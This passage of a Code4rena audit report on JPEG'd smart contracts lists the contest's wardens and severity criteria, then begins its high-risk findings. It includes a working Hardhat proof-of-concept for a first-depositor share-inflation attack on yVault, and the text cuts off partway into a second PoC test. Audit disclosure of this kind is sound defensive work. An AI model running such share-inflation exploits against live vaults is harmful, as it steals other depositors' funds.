{
  "circa": {
    "title": "JPEG'd contest",
    "sponsor": "JPEG'd",
    "slug": "2022-04-jpegd",
    "date": "2022-06-10",
    "findings": "https://github.com/code-423n4/2022-04-jpegd-findings/issues",
    "contest": 107
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the JPEG’d smart contract system written in Solidity. The audit contest took place between April 7—April 13 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>66 Wardens contributed reports to the JPEG’d contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li><a href=\"https://twitter.com/HickupH\">hickuphh3</a></li>\n<li><a href=\"https://twitter.com/rayn731\">rayn</a></li>\n<li><a href=\"https://twitter.com/WatchPug_\">WatchPug</a></li>\n<li><a href=\"https://twitter.com/JustDravee\">Dravee</a></li>\n<li>TrungOre</li>\n<li><a href=\"https://twitter.com/berndartmueller\">berndartmueller</a></li>\n<li><a href=\"https://twitter.com/nonfungiblenero\">Kenshin</a></li>\n<li>minhquanym</li>\n<li>AuditsAreUS</li>\n<li>0xDjango</li>\n<li>IllIllI</li>\n<li>cccz</li>\n<li>Jujic</li>\n<li>hyh</li>\n<li><a href=\"https://twitter.com/Pedroais2/\">pedroais</a></li>\n<li>Kthere</li>\n<li>Foundation (<a href=\"https://twitter.com/HardlyDifficult\">HardlyDifficult</a> and <a href=\"https://twitter.com/ba2inal/\">batu</a>)</li>\n<li>0x1f8b</li>\n<li>PPrieditis</li>\n<li>robee</li>\n<li><a href=\"https://twitter.com/Meta0xNull\">Meta0xNull</a></li>\n<li><a href=\"https://www.instagram.com/riyan_rfa/\">rfa</a></li>\n<li>0xkatana</li>\n<li>TerrierLover</li>\n<li>Cr4ckM3</li>\n<li>ilan</li>\n<li><a href=\"https://instagram.com/vanensurya\">Funen</a></li>\n<li><a href=\"https://twitter.com/MukeshJ_eth\">JMukesh</a></li>\n<li><a href=\"https://twitter.com/catchup22\">catchup</a></li>\n<li>kenta</li>\n<li>kebabsec (okkothejawa and <a href=\"https://twitter.com/FlameHorizon1\">FlameHorizon</a>)</li>\n<li><a href=\"https://twitter.com/ellahinator\">ellahi</a></li>\n<li>Hawkeye (0xwags and 0xmint)</li>\n<li>Cityscape</li>\n<li>horsefacts</li>\n<li>delfin454000</li>\n<li><a href=\"https://twitter.com/thePicodes\">Picodes</a></li>\n<li><a href=\"https://github.com/SmilingHeretic\">smiling_heretic</a></li>\n<li>Wayne</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>reassor</li>\n<li>hubble (ksk2345 and shri4net)</li>\n<li>saian</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li><a href=\"https://davidyat.es\">dy</a></li>\n<li><a href=\"https://twitter.com/SolidityDev\">pauliax</a></li>\n<li>samruna</li>\n<li>jayjonah8</li>\n<li><a href=\"https://twitter.com/meidhiwirara\">Tomio</a></li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/_0v3rf10w\">0v3rf10w</a></li>\n<li><a href=\"https://twitter.com/securerodd\">securerodd</a></li>\n<li>FSchmoede</li>\n<li>slywaters</li>\n<li><a href=\"twitter.com/rokinot\">rokinot</a></li>\n<li>nahnah</li>\n<li>sorrynotsorry</li>\n<li>dirk_y</li>\n<li><a href=\"https://twitter.com/defsec_\">defsec</a></li>\n<li>joshie</li>\n<li>peritoflores</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/lsdan_defi\">LSDan</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 20 unique vulnerabilities. Of these vulnerabilities, 9 received a risk rating in the category of HIGH severity and 11 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 42 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 38 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-04-jpegd\">C4 JPEG’d contest repository</a>, and is composed of 14 smart contracts written in the Solidity programming language and includes 3,118 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-9\" style=\"position:relative;\"><a href=\"#high-risk-findings-9\" aria-label=\"high risk findings 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (9)</h1>\n<h2 id=\"h-01-yvault-first-depositor-can-break-minting-of-shares\" style=\"position:relative;\"><a href=\"#h-01-yvault-first-depositor-can-break-minting-of-shares\" aria-label=\"h 01 yvault first depositor can break minting of shares permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/12\">[H-01] yVault: First depositor can break minting of shares</a></h2>\n<p><em>Submitted by hickuphh3, also found by 0xDjango, berndartmueller, cmichel, hyh, and WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153\">yVault.sol#L148-L153</a><br></p>\n<p>The attack vector and impact is the same as <a href=\"https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf\">TOB-YEARN-003</a>, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>Attacker deposits 1 wei to mint 1 share</li>\n<li>Attacker transfers exorbitant amount to the <code>StrategyPUSDConvex</code> contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its <code>deposit()</code> function is called.</li>\n<li>Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.</li>\n</ul>\n<p>Insert this test into <a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts\"><code>yVault.ts</code></a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;will cause 0 share issuance&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// mint 10k + 1 wei tokens to user1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// mint 10k tokens to owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// token approval to yVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 1. user1 mints 1 wei = 1 share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 2. do huge transfer of 10k to strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// to greatly inflate share price (1 share = 10k + 1 wei)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 3. owner deposits 10k</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// receives 0 shares in return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// user1 withdraws both his and owner&#39;s deposits</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// total amt: 20k + 1 wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdrawAll</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeTokenBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li><a href=\"https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124\">Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address</a>. The same can be done in this case i.e. when <code>totalSupply() == 0</code>, send the first min liquidity LP tokens to the zero address to enable share dilution.</li>\n<li>Ensure the number of shares to be minted is non-zero: <code>require(_shares != 0, \"zero shares minted\");</code></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/12\">spaghettieth (JPEG’d) confirmed, but disagreed with High severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/12#issuecomment-1099249025\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/16\">jpegd/core#16</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-existing-users-locked-jpeg-could-be-overwritten-by-new-user-causing-permanent-loss-of-jpeg-funds\" style=\"position:relative;\"><a href=\"#h-02-existing-users-locked-jpeg-could-be-overwritten-by-new-user-causing-permanent-loss-of-jpeg-funds\" aria-label=\"h 02 existing users locked jpeg could be overwritten by new user causing permanent loss of jpeg funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/10\">[H-02] Existing user’s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds</a></h2>\n<p><em>Submitted by hickuphh3, also found by 0x1f8b, AuditsAreUS, Foundation, Kthere, Meta0xNull, rayn, and WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L375\">NFTVault.sol#L375</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/lock/JPEGLock.sol#L54-L62\">JPEGLock.sol#L54-L62</a><br></p>\n<p>A user’s JPEG lock schedule can be overwritten by another user’s if he (the other user) submits and finalizes a proposal to change the same NFT index’s value.</p>\n<p>The existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li><code>user</code> successfully proposes and finalizes a proposal to change his NFT’s collateral value</li>\n<li>Another user (<code>owner</code>) does the same for the same NFT index</li>\n<li><code>user</code> will be unable to withdraw his locked JPEG because schedule has been overwritten</li>\n</ol>\n<p>Insert this test case into <a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts\"><code>NFTVault.ts</code></a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;will overwrite existing user&#39;s JPEG lock schedule&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 0. setup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">7000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc721</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 